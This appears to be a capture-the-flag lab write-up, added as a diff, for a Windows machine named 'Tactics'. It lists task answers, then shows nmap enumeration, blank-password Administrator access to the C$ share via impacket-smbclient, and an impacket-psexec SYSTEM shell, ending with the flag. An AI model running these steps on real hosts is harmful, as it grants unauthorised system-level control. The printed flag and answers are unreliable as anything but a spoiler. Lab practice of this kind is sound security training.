@@ -1,0 +1,185 @@
+2025-04-08 09:12:20 CDT -- START TIME
+### Tactics ###
+--------------------------------------
+
+
+|================================================================
+- Name: TACTICS
+- IP Address: 10.129.128.77
+- OS: Windows 10 / Server 2019 Build 17763 x64
+- Notes: 
+
+//CREDS: 
+		SMB: Administrator/''
+
+
+//Flag: f751c19eda8f61ce81827e6930a1f40c
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// Tasks
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+#1 Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?
+	-Pn
+
+#2 What does the 3-letter acronym SMB stand for?
+	Server Message Block
+
+#3 What port does SMB use to operate at?
+	445
+
+#4 What command line argument do you give to `smbclient` to list available shares?
+	-L	
+
+#5 What character at the end of a share name indicates it's an administrative share?
+	$
+
+#6 Which Administrative share is accessible on the box that allows users to view the whole file system?
+	C$
+
+#7 What command can we use to download the files we find on the SMB Share?
+	get
+
+#8 Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?
+	psexec.py
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2025-04-08 10:31:46 CDT -- 
+// SCAN
+ip=10.129.128.77
+ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep '^[0-9]' | cut -d '/' -f 1 | paste -sd ',' -)
+
+echo $ports
+//135,139,445
+
+2025-04-08 10:34:18 CDT -- 
+sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (91%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (91%), Microsoft Windows 10 1903 - 21H1 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-04-08T15:33:28
+|_  start_date: N/A
+
+
+# UDP scan
+sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap
+//NOthing
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// crackmapexec SMB
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Check SMB information
+crackmapexec smb $ip
+SMB         10.129.128.77   445    TACTICS          [*] Windows 10 / Server 2019 Build 17763 x64 (name:TACTICS) (domain:Tactics) (signing:False) (SMBv1:False)
+
+
+//Test NULL session access
+crackmapexec smb $ip -u '' -p ''
+SMB         10.129.128.77   445    TACTICS          [-] Tactics\: STATUS_ACCESS_DENIED
+
+
+//Test [Administrator/Guest] user access
+crackmapexec smb $ip -u Administrator -p ''
+crackmapexec smb $ip -u Guest -p ''
+//Nothing
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// impacket-smbclient --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2025-04-08 12:21:05 CDT -- 
+impacket-smbclient Administrator@$ip
+
+# info
+Version Major: 10
+Version Minor: 0
+Server Name: TACTICS
+Server Comment: 
+Server UserPath: c:\
+Simultaneous Users: 16777216
+
+# shares
+ADMIN$
+C$
+IPC$
+
+# ls /Users/Administrator/Desktop/*
+-rw-rw-rw-        282  Wed Apr 21 10:23:31 2021 desktop.ini
+-rw-rw-rw-         32  Fri Apr 23 04:39:00 2021 flag.txt
+
+# cat /Users/Administrator/Desktop/flag.txt
+f751c19eda8f61ce81827e6930a1f40c
+
+# get /Users/Administrator/Desktop/flag.txt
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// impacket-psexec --
+// Example for exercise
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# Login
+impacket-psexec Administrator@$ip
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Requesting shares on 10.129.128.77.....
+[*] Found writable share ADMIN$
+[*] Uploading file vxgHXJIk.exe
+[*] Opening SVCManager on 10.129.128.77.....
+[*] Creating service lrhF on 10.129.128.77.....
+[*] Starting service lrhF.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//FLAG: f751c19eda8f61ce81827e6930a1f40c
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2025-04-08 13:03:14 CDT -- COMPLETE
+
